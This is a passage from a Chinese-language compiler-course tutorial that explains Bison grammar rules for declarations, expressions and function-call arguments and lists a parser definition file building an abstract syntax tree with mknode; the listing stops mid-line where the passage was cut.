<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">DefList: &#123;$$=<span class="literal">NULL</span>; &#125;</span><br><span class="line">         | Def DefList &#123;$$=mknode(DEF_LIST,$<span class="number">1</span>,$<span class="number">2</span>,<span class="literal">NULL</span>,yylineno);&#125;</span><br><span class="line">         ;</span><br></pre></td></tr></table></figure>
<ul>
<li>对于每个 DefList 有2种可能：<ul>
<li>对应 NULL</li>
<li>对应多个定义 Def，则生成 DEF_LIST 节点</li>
</ul>
</li>
</ul>
<p>Def-定义：定义一个或多个定义语句，由分号隔开</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Def: Specifier DecList SEMI &#123;$$=mknode(VAR_DEF,$<span class="number">1</span>,$<span class="number">2</span>,<span class="literal">NULL</span>,yylineno);&#125;</span><br><span class="line">     | Specifier ArrayDec SEMI &#123;$$=mknode(ARRAY_DEF,$<span class="number">1</span>,$<span class="number">2</span>,<span class="literal">NULL</span>,yylineno);&#125;</span><br><span class="line">     ;</span><br></pre></td></tr></table></figure>
<ul>
<li>对于每个 Def 有2种可能：<ul>
<li>对应变量的定义，则生成 VAR_DEF 节点</li>
<li>对应数组的定义，则生成 ARRAY_DEF 节点</li>
</ul>
</li>
</ul>
<p>DecList-语句列表：由一个或多个语句组成，由逗号隔开，最终都成一个表达式</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">DecList: Dec &#123;$$=mknode(DEC_LIST,$<span class="number">1</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,yylineno);&#125;</span><br><span class="line">         | Dec COMMA DecList &#123;$$=mknode(DEC_LIST,$<span class="number">1</span>,$<span class="number">3</span>,<span class="literal">NULL</span>,yylineno);&#125;</span><br><span class="line">         ;</span><br></pre></td></tr></table></figure>
<ul>
<li>对于每个 DecList 有2种可能：<ul>
<li>对应一个语句 Dec，则生成 DEC_LIST 节点</li>
<li>对应用逗号隔开的多个 Dec，则生成 DEC_LIST 节点</li>
</ul>
</li>
</ul>
<p>Dec-语句：一个变量名称或者一个赋值语句（变量名称等于一个表达式）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Dec: VarDec &#123;$$=$<span class="number">1</span>;&#125;</span><br><span class="line">     | VarDec ASSIGNOP Exp &#123;$$=mknode(ASSIGNOP,$<span class="number">1</span>,$<span class="number">3</span>,<span class="literal">NULL</span>,yylineno);<span class="built_in">strcpy</span>($$-&gt;type_id,<span class="string">&quot;ASSIGNOP&quot;</span>);&#125;</span><br><span class="line">     ;</span><br></pre></td></tr></table></figure>
<ul>
<li>对于每个 Dec 有2种可能：<ul>
<li>对应一个变量名称 VarDec</li>
<li>对应一个赋值语句，则生成 ASSIGNOP 节点</li>
</ul>
</li>
</ul>
<p>Exp-表达式：代表数字或是数字之间的运算，和函数调用</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Exp: Exp ASSIGNOP Exp &#123;$$=mknode(ASSIGNOP,$<span class="number">1</span>,$<span class="number">3</span>,<span class="literal">NULL</span>,yylineno);<span class="built_in">strcpy</span>($$-&gt;type_id,<span class="string">&quot;ASSIGNOP&quot;</span>);&#125; <span class="comment">// $$结点type_id空置未用,正好存放运算符</span></span><br><span class="line">     | Exp AND Exp &#123;$$=mknode(AND,$<span class="number">1</span>,$<span class="number">3</span>,<span class="literal">NULL</span>,yylineno);<span class="built_in">strcpy</span>($$-&gt;type_id,<span class="string">&quot;AND&quot;</span>);&#125;</span><br><span class="line">     | Exp OR Exp &#123;$$=mknode(OR,$<span class="number">1</span>,$<span class="number">3</span>,<span class="literal">NULL</span>,yylineno);<span class="built_in">strcpy</span>($$-&gt;type_id,<span class="string">&quot;OR&quot;</span>);&#125;</span><br><span class="line">     | Exp RELOP Exp &#123;$$=mknode(RELOP,$<span class="number">1</span>,$<span class="number">3</span>,<span class="literal">NULL</span>,yylineno);<span class="built_in">strcpy</span>($$-&gt;type_id,$<span class="number">2</span>);&#125; <span class="comment">// 词法分析关系运算符号自身值保存在$2中</span></span><br><span class="line">     | Exp PLUS Exp &#123;$$=mknode(PLUS,$<span class="number">1</span>,$<span class="number">3</span>,<span class="literal">NULL</span>,yylineno);<span class="built_in">strcpy</span>($$-&gt;type_id,<span class="string">&quot;PLUS&quot;</span>);&#125;</span><br><span class="line">     | Exp MINUS Exp &#123;$$=mknode(MINUS,$<span class="number">1</span>,$<span class="number">3</span>,<span class="literal">NULL</span>,yylineno);<span class="built_in">strcpy</span>($$-&gt;type_id,<span class="string">&quot;MINUS&quot;</span>);&#125;</span><br><span class="line">     | Exp STAR Exp &#123;$$=mknode(STAR,$<span class="number">1</span>,$<span class="number">3</span>,<span class="literal">NULL</span>,yylineno);<span class="built_in">strcpy</span>($$-&gt;type_id,<span class="string">&quot;STAR&quot;</span>);&#125;</span><br><span class="line">     | Exp DIV Exp &#123;$$=mknode(DIV,$<span class="number">1</span>,$<span class="number">3</span>,<span class="literal">NULL</span>,yylineno);<span class="built_in">strcpy</span>($$-&gt;type_id,<span class="string">&quot;DIV&quot;</span>);&#125;</span><br><span class="line">     | Exp COMADD Exp &#123;$$=mknode(COMADD,$<span class="number">1</span>,$<span class="number">3</span>,<span class="literal">NULL</span>,yylineno);<span class="built_in">strcpy</span>($$-&gt;type_id,<span class="string">&quot;COMADD&quot;</span>);&#125;</span><br><span class="line">     | Exp COMSUB Exp &#123;$$=mknode(COMSUB,$<span class="number">1</span>,$<span class="number">3</span>,<span class="literal">NULL</span>,yylineno);<span class="built_in">strcpy</span>($$-&gt;type_id,<span class="string">&quot;COMSUB&quot;</span>);&#125;</span><br><span class="line">     | LP Exp RP &#123;$$=$<span class="number">2</span>;&#125; <span class="comment">/* 遇到左右括号,可直接忽略括号,Exp的值就为括号里面的Exp */</span></span><br><span class="line">     | MINUS Exp %prec UMINUS &#123;$$=mknode(UMINUS,$<span class="number">2</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,yylineno);<span class="built_in">strcpy</span>($$-&gt;type_id,<span class="string">&quot;UMINUS&quot;</span>);&#125;</span><br><span class="line">     | NOT Exp &#123;$$=mknode(NOT,$<span class="number">2</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,yylineno);<span class="built_in">strcpy</span>($$-&gt;type_id,<span class="string">&quot;NOT&quot;</span>);&#125;</span><br><span class="line">     | AUTOADD Exp &#123;$$=mknode(AUTOADD_L,$<span class="number">2</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,yylineno);<span class="built_in">strcpy</span>($$-&gt;type_id,<span class="string">&quot;AUTOADD&quot;</span>);&#125;</span><br><span class="line">     | AUTOSUB Exp &#123;$$=mknode(AUTOSUB_L,$<span class="number">2</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,yylineno);<span class="built_in">strcpy</span>($$-&gt;type_id,<span class="string">&quot;AUTOSUB&quot;</span>);&#125;</span><br><span class="line">     | Exp AUTOADD &#123;$$=mknode(AUTOADD_R,$<span class="number">1</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,yylineno);<span class="built_in">strcpy</span>($$-&gt;type_id,<span class="string">&quot;AUTOADD&quot;</span>);&#125;</span><br><span class="line">     | Exp AUTOSUB &#123;$$=mknode(AUTOSUB_R,$<span class="number">1</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,yylineno);<span class="built_in">strcpy</span>($$-&gt;type_id,<span class="string">&quot;AUTOSUB&quot;</span>);&#125;</span><br><span class="line">     | ID LP Args RP &#123;$$=mknode(FUNC_CALL,$<span class="number">3</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,yylineno);<span class="built_in">strcpy</span>($$-&gt;type_id,$<span class="number">1</span>);&#125; <span class="comment">// 函数调用后面的括号部分,只需要把括号里面的内容传入即可</span></span><br><span class="line">     | ID LP RP &#123;$$=mknode(FUNC_CALL,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,yylineno);<span class="built_in">strcpy</span>($$-&gt;type_id,$<span class="number">1</span>);&#125; <span class="comment">// 函数调用后面的括号部分没有参数</span></span><br><span class="line">     | ID &#123;$$=mknode(ID,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,yylineno);<span class="built_in">strcpy</span>($$-&gt;type_id,$<span class="number">1</span>);&#125;</span><br><span class="line">     | INT &#123;$$=mknode(INT,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,yylineno);$$-&gt;type_int=$<span class="number">1</span>;$$-&gt;type=INT;&#125;</span><br><span class="line">     | FLOAT &#123;$$=mknode(FLOAT,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,yylineno);$$-&gt;type_float=$<span class="number">1</span>;$$-&gt;type=FLOAT;&#125;</span><br><span class="line">     | CHAR &#123;$$=mknode(CHAR,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,yylineno); $$-&gt;type_char=$<span class="number">1</span>;$$-&gt;type=CHAR;&#125;</span><br><span class="line">     ;</span><br></pre></td></tr></table></figure>
<ul>
<li>对于每个 Exp 有23种可能：<ul>
<li>前10种可能分别对应：等于 ASSIGNOP，和 AND，或 OR，二元运算符 RELOP，加 PLUS，减 MINUS，乘 STAR，除 DIV，加等于 COMADD，减等于 COMSUB，都会生成对应的节点</li>
<li>第11种可能分别对应：左右括号</li>
<li>第12,13种可能分别对应：负操作和非操作，分别生成 UMINUS 和 NOT 节点</li>
<li>第14-17种可能分别对应：加加 AUTOADD 和减减 AUTOSUB 的左右操作，分别生成4种类型的节点</li>
<li>第18,19种可能对应：函数的有参调用和无参调用，都生成 FUNC_CALL 节点</li>
<li>最后4种可能对应：ID，INT，FLOAT，CHAR</li>
</ul>
</li>
</ul>
<p>Args-用逗号隔开的参数（和参数定义 ParamDec 不同）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Args: Exp COMMA Args &#123;$$=mknode(ARGS,$<span class="number">1</span>,$<span class="number">3</span>,<span class="literal">NULL</span>,yylineno);&#125;</span><br><span class="line">      | Exp &#123;$$=mknode(ARGS,$<span class="number">1</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,yylineno);&#125;</span><br><span class="line">      ;</span><br></pre></td></tr></table></figure>
<ul>
<li>参数 Args 只在函数调用时使用</li>
<li>对于每个 Args 有2种可能：<ul>
<li>对应用逗号隔开的多个 Exp</li>
<li>对应一个 Exp</li>
</ul>
</li>
</ul>
<p>实现代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br></pre></td><td class="code"><pre><span class="line">%define parse.error verbose <span class="comment">// 指示bison生成详细的错误消息</span></span><br><span class="line">%locations <span class="comment">// 记录行号</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">/* 声明部分 */</span></span><br><span class="line">%&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdio.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;math.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;string.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;def.h&quot;</span></span></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">int</span> yylineno;</span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">char</span> *yytext;</span><br><span class="line"><span class="keyword">extern</span> FILE *yyin;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">yyerror</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* fmt, ...)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">display</span><span class="params">(struct node *,<span class="keyword">int</span>)</span></span>;</span><br><span class="line">%&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 辅助声明部分 */</span></span><br><span class="line"><span class="comment">/* Bison中默认将所有的语义值都定义为int类型,可以通过定义宏YYSTYPE来改变值的类型</span></span><br><span class="line"><span class="comment">如果有多个值类型,则需要通过在Bison声明中使用%union列举出所有的类型 */</span></span><br><span class="line">%<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> type_int;</span><br><span class="line">  <span class="keyword">float</span> type_float;</span><br><span class="line">  <span class="keyword">char</span> type_char;</span><br><span class="line">  <span class="keyword">char</span> type_id[<span class="number">32</span>];</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">ptr</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* %type 定义非终结符的语义值类型: %type &lt;union 的成员名&gt; 非终结符 */</span></span><br><span class="line"><span class="comment">/* %type &lt;ptr&gt; program ExtDefList:表示非终结符ExtDefList属性值的类型对应联合中成员ptr的类型,在本实验中对应一个树结点的指针 */</span></span><br><span class="line">%type &lt;ptr&gt; program ExtDefList ExtDef Specifier ExtDecList FuncDec ArrayDec CompSt VarList VarDec ParamDec Stmt StmList DefList Def DecList Dec Exp Args</span><br><span class="line"></span><br><span class="line"><span class="comment">/* %token 定义终结符的语义值类型: %token &lt;union 的成员名&gt; 终结符  */</span></span><br><span class="line"><span class="comment">/* %token &lt;type_id&gt; ID:表示识别出来一个ID标识符后,标识符的字符串值保存在成员type_id */</span></span><br><span class="line">%token &lt;type_int&gt; INT <span class="comment">// 指定INT的语义值是type_int,由词法分析得到的数值</span></span><br><span class="line">%token &lt;type_id&gt; ID RELOP TYPE <span class="comment">// 指定ID,RELOP的语义值是type_id,由词法分析得到标识符字符串</span></span><br><span class="line">%token &lt;type_float&gt; FLOAT <span class="comment">// 指定ID的语义值是type_float,由词法分析得到的数值</span></span><br><span class="line">%token &lt;type_char&gt; CHAR <span class="comment">// 指定ID的语义值是type_char,由词法分析得到的数值</span></span><br><span class="line">%token LP RP LC RC LB RB SEMI COMMA</span><br><span class="line">%token PLUS MINUS STAR DIV COMADD COMSUB ASSIGNOP AND OR NOT IF ELSE WHILE FOR RETURN</span><br><span class="line">    </span><br><span class="line"><span class="comment">/* 优先级 */</span></span><br><span class="line">%left COMADD COMSUB <span class="comment">/* %left:表示左结合,前面符号的优先级低 */</span></span><br><span class="line">%left ASSIGNOP</span><br><span class="line">%left OR</span><br><span class="line">%left AND</span><br><span class="line">%left RELOP</span><br><span class="line">%left PLUS MINUS</span><br><span class="line">%left STAR DIV</span><br><span class="line">%right UMINUS NOT AUTOADD AUTOSUB <span class="comment">/* %right:定义一个优先级更高的单目,符号UMINUS */</span></span><br><span class="line">%nonassoc LOWER_THEN_ELSE <span class="comment">/* %nonassoc:没有结合性一般与%prec结合使用,表示该操作有同样的优先级 */</span></span><br><span class="line">%nonassoc ELSE</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 规则部分 */</span></span><br><span class="line">%%</span><br><span class="line">program: ExtDefList &#123; display($<span class="number">1</span>,<span class="number">0</span>);&#125; <span class="comment">/* 归约到program,显示语法树(display是自己实现的,用于可视化AST的函数) */</span></span><br><span class="line">         ;</span><br><span class="line"><span class="comment">/* ExtDefList-外部定义列表:即是整个语法树 */</span></span><br><span class="line">ExtDefList: &#123;$$=<span class="literal">NULL</span>;&#125; <span class="comment">// 整个语法树为空 </span></span><br><span class="line">            | ExtDef ExtDefList &#123;$$=mknode(EXT_DEF_LIST,$<span class="number">1</span>,$<span class="number">2</span>,<span class="literal">NULL</span>,yylineno);&#125; <span class="comment">// 每一个EXTDEFLIST的结点,其第1棵子树对应一个外部变量声明或函数</span></span><br><span class="line">            ;</span><br><span class="line"><span class="comment">/* ExtDef-外部声明:声明外部变量或者声明函数 */</span></span><br><span class="line">ExtDef: Specifier ExtDecList SEMI &#123;$$=mknode(EXT_VAR_DEF,$<span class="number">1</span>,$<span class="number">2</span>,<span class="literal">NULL</span>,yylineno);&#125; <span class="comment">// 该结点对应一个外部变量声明</span></span><br><span class="line">        | Specifier ArrayDec SEMI &#123;$$=mknode(ARRAY_DEF,$<span class="number">1</span>,$<span class="number">2</span>,<span class="literal">NULL</span>,yylineno);&#125; <span class="comment">// 数组定义</span></span><br><span class="line">        | Specifier FuncDec CompSt &#123;$$=mknode(FUNC_DEF,$<span class="number">1</span>,$<span class="number">2</span>,$<span class="number">3</span>,yylineno);&#125; <span class="comment">// 该结点对应一个函数定义,类型+函数声明+复合语句</span></span><br><span class="line">        | error SEMI &#123;$$=<span class="literal">NULL</span>; <span class="built_in">printf</span>(<span class="string">&quot;---缺少分号---\n&quot;</span>);&#125;</span><br><span class="line">        ;</span><br><span class="line"><span class="comment">/* Specifier-类型:表示一个类型(int,float) */</span></span><br><span class="line">Specifier: TYPE &#123;$$=mknode(TYPE,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,yylineno);<span class="built_in">strcpy</span>($$-&gt;type_id,$<span class="number">1</span>);$$-&gt;type=(!<span class="built_in">strcmp</span>($<span class="number">1</span>,<span class="string">&quot;int&quot;</span>)?INT:(!<span class="built_in">strcmp</span>($<span class="number">1</span>,<span class="string">&quot;float&quot;</span>)?FLOAT:CHAR));&#125;</span><br><span class="line">           ;</span><br><span class="line"><span class="comment">/* ExtDecList-变量名称列表:由一个或多个变量组成,多个变量之间用逗号隔开 */</span></span><br><span class="line">ExtDecList: VarDec &#123;$$=$<span class="number">1</span>;&#125; <span class="comment">// 每一个EXT_DECLIST的结点,其第一棵子树对应一个变量名(ID类型的结点),第二棵子树对应剩下的外部变量名</span></span><br><span class="line">            | VarDec COMMA ExtDecList &#123;$$=mknode(EXT_DEC_LIST,$<span class="number">1</span>,$<span class="number">3</span>,<span class="literal">NULL</span>,yylineno);&#125;</span><br><span class="line">            ;</span><br><span class="line"><span class="comment">/* VarDec-变量名称:由一个ID组成 */</span></span><br><span class="line">VarDec: ID &#123;$$=mknode(ID,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,yylineno);<span class="built_in">strcpy</span>($$-&gt;type_id,$<span class="number">1</span>);&#125; <span class="comment">// ID结点,标识符符号串存放结点的type_id</span></span><br><span class="line">        ;</span><br><span class="line"><span class="comment">/* FuncDec-函数声明:包括函数名和参数定义 */</span></span><br><span class="line">FuncDec: ID LP VarList RP &#123;$$=mknode(FUNC_DEC,$<span class="number">3</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,yylineno);<span class="built_in">strcpy</span>($$-&gt;type_id,$<span class="number">1</span>);&#125; <span class="comment">// 函数名存放在$$-&gt;type_id</span></span><br><span class="line">         | ID LP RP &#123;$$=mknode(FUNC_DEC,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,yylineno);<span class="built_in">strcpy</span>($$-&gt;type_id,$<span class="number">1</span>);&#125; <span class="comment">// 函数名存放在$$-&gt;type_id</span></span><br><span class="line">         | error RP &#123;$$=<span class="literal">NULL</span>; <span class="built_in">printf</span>(<span class="string">&quot;---函数左括号右括号不匹配---\n&quot;</span>);&#125;</span><br><span class="line">         ;</span><br><span class="line"><span class="comment">/* ArrayDec-数组声明 */</span></span><br><span class="line">ArrayDec: ID LB Exp RB &#123;$$=mknode(ARRAY_DEC,$<span class="number">3</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,yylineno);<span class="built_in">strcpy</span>($$-&gt;type_id,$<span class="number">1</span>);&#125;</span><br><span class="line">          | ID LB RB &#123;$$=mknode(ARRAY_DEC,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,yylineno);<span class="built_in">strcpy</span>($$-&gt;type_id,$<span class="number">1</span>);&#125;</span><br><span class="line">          | error RB &#123;$$=<span class="literal">NULL</span>;<span class="built_in">printf</span>(<span class="string">&quot;---数组定义错误---\n&quot;</span>);&#125;</span><br><span class="line"><span class="comment">/* VarList-参数定义列表:由一个到多个参数定义组成,用逗号隔开 */</span></span><br><span class="line">VarList: ParamDec &#123;$$=mknode(PARAM_LIST,$<span class="number">1</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,yylineno);&#125;</span><br><span class="line">         | ParamDec COMMA VarList &#123;$$=mknode(PARAM_LIST,$<span class="number">1</span>,$<span class="number">3</span>,<span class="literal">NULL</span>,yylineno);&#125;</span><br><span class="line">         ;</span><br><span class="line"><span class="comment">/* ParamDec-参数定义:固定由一个类型和一个变量组成 */</span></span><br><span class="line">ParamDec: Specifier VarDec &#123;$$=mknode(PARAM_DEC,$<span class="number">1</span>,$<span class="number">2</span>,<span class="literal">NULL</span>,yylineno);&#125;</span><br><span class="line">          ;</span><br><span class="line"><span class="comment">/* CompSt-复合语句:左右分别用大括号括起来,中间有定义列表和语句列表 */</span></span><br><span class="line">CompSt: LC DefList StmList RC &#123;$$=mknode(COMP_STM,$<span class="number">2</span>,$<span class="number">3</span>,<span class="literal">NULL</span>,yylineno);&#125;</span><br><span class="line">        | error RC &#123;$$=<span class="literal">NULL</span>; <span class="built_in">printf</span>(<span class="string">&quot;---复合语句内存在错误---\n&quot;</span>);&#125;</span><br><span class="line">        ;</span><br><span class="line"><span class="comment">/* StmList-语句列表:由0个或多个语句stmt组成 */</span></span><br><span class="line">StmList: &#123;$$=<span class="literal">NULL</span>;&#125;</span><br><span class="line">         | Stmt StmList &#123;$$=mknode(STM_LIST,$<span class="number">1</span>,$<span class="number">2</span>,<span class="literal">NULL</span>,yylineno);&#125;</span><br><span class="line">         ;</span><br><span class="line"><span class="comment">/* Stmt-语句:可能为表达式,复合语句,return语句,if语句,if-else语句,while语句,for语句 */</span></span><br><span class="line">Stmt: Exp SEMI &#123;$$=mknode(EXP_STMT,$<span class="number">1</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,yylineno);&#125;</span><br><span class="line">      | CompSt &#123;$$=$<span class="number">1</span>;&#125; <span class="comment">// 复合语句结点直接最为语句结点,不再生成新的结点</span></span><br><span class="line">      | RETURN Exp SEMI &#123;$$=mknode(RETURN,$<span class="number">2</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,yylineno);&#125;</span><br><span class="line">      | IF LP Exp RP Stmt %prec LOWER_THEN_ELSE &#123;$$=mknode(IF_THEN,$<span class="number">3</span>,$<span class="number">5</span>,<span class="literal">NULL</span>,yylineno);&#125;</span><br><span class="line">      | IF LP Exp RP Stmt ELSE Stmt &#123;$$=mknode(IF_THEN_ELSE,$<span class="number">3</span>,$<span class="number">5</span>,$<span class="number">7</span>,yylineno);&#125;</span><br><span class="line">      | WHILE LP Exp RP Stmt &#123;$$=mknode(WHILE,$<span class="number">3</span>,$<span class="number">5</span>,<span class="literal">NULL</span>,yylineno);&#125;</span><br><span class="line">      | FOR LP Exp RP Stmt &#123;$$=mknode(FOR,$<span class="number">3</span>,$<span class="number">5</span>,<span class="literal">NULL</span>,yylineno);&#125;</span><br><span class="line">      ;</span><br><span class="line"><span class="comment">/* DefList-定义列表:由0个或多个定义语句组成 */</span></span><br><span class="line">DefList: &#123;$$=<span class="literal">NULL</span>; &#125;</span><br><span class="line">         | Def DefList &#123;$$=mknode(DEF_LIST,$<span class="number">1</span>,$<span class="number">2</span>,<span class="literal">NULL</span>,yylineno);&#125;</span><br><span class="line">         ;</span><br><span class="line"><span class="comment">/* Def-定义:定义一个或多个语句语句,由分号隔开 */</span></span><br><span class="line">Def: Specifier DecList SEMI &#123;$$=mknode(VAR_DEF,$<span class="number">1</span>,$<span class="number">2</span>,<span class="literal">NULL</span>,yylineno);&#125;</span><br><span class="line">     | Specifier ArrayDec SEMI &#123;$$=mknode(ARRAY_DEF,$<span class="number">1</span>,$<span class="number">2</span>,<span class="literal">NULL</span>,yylineno);&#125;</span><br><span class="line">     ;</span><br><span class="line"><span class="comment">/* DecList-语句列表:由一个或多个语句组成,由逗号隔开,最终都成一个表达式 */</span></span><br><span class="line">DecList: Dec &#123;$$=mknode(DEC_LIST,$<span class="number">1</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,yylineno);&#125;</span><br><span class="line">         | Dec COMMA DecList &#123;$$=mknode(DEC_LIST,$<span class="number">1</span>,$<span class="number">3</span>,<span class="literal">NULL</span>,yylineno);&#125;</span><br><span class="line">         ;</span><br><span class="line"><span class="comment">/* Dec-语句:一个变量名称或者一个赋值语句(变量名称等于一个表达式) */</span></span><br><span class="line">Dec: VarDec &#123;$$=$<span class="number">1</span>;&#125;</span><br><span class="line">     | VarDec ASSIGNOP Exp &#123;$$=mknode(ASSIGNOP,$<span class="number">1</span>,$<span class="number">3</span>,<span class="literal">NULL</span>,yylineno);<span class="built_in">strcpy</span>($$-&gt;type_id,<span class="string">&quot;ASSIGNOP&quot;</span>);&#125;</span><br><span class="line">     ;</span><br><span class="line"><span class="comment">/* Exp-表达式 */</span></span><br><span class="line">Exp: Exp ASSIGNOP Exp &#123;$$=mknode(ASSIGNOP,$<span class="number">1</span>,$<span class="number">3</span>,<span class="literal">NULL</span>,yylineno);<span 